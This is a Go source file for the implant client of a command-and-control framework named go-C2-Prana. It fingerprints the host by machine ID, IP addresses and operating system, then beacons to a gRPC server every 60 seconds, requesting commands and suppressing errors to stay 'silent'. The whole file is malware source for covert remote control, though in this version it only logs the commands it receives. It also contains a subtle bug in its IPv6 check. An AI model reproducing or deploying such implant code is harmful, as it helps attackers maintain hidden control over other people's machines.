package main

import (
	"context"
	"github.com/denisbrodbeck/machineid"
	"github.dev/nireitdev/go-C2-Prana/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"log"
	"net"
	"runtime"
	"time"
)

func getAddrs() string {
	addr, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	ip := ""
	for _, addr := range addr {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			// check if IPv4 or IPv6 is not nil
			if ipnet.IP.To4() != nil || ipnet.IP.To16 != nil {
				ip = ip + ";" + ipnet.IP.String()
			}
		}
	}
	return ip
}

func main() {
	//Coneccion al server:
	opts := grpc.DialOption(grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err := grpc.NewClient("localhost:3000", opts)
	if err != nil {
		log.Fatalln("Imposible conectar con el servidor. Bye!")
	}
	defer conn.Close()

	srv := proto.NewServerClient(conn)

	//Who I am?
	id, err := machineid.ID()
	if err != nil {
		//log.Fatal(err)  //Silent!!
	}
	ips := getAddrs()
	os := runtime.GOOS

	for {
		srv.ImplantAlive(context.Background(), &proto.AliveMsg{ImplantID: id, IpAddr: ips, OS: os})

		//test msg:
		req := proto.ImplantRequest{Request: "Implanted!"}
		resp, err := srv.ImplantCmd(context.Background(), &req)
		if err != nil {
			log.Fatalf("Fallo intercambio de msgs: %v \n", err)
		}

		log.Println("Recibido:", resp.Result)
		time.Sleep(60 * time.Second)
	}

}
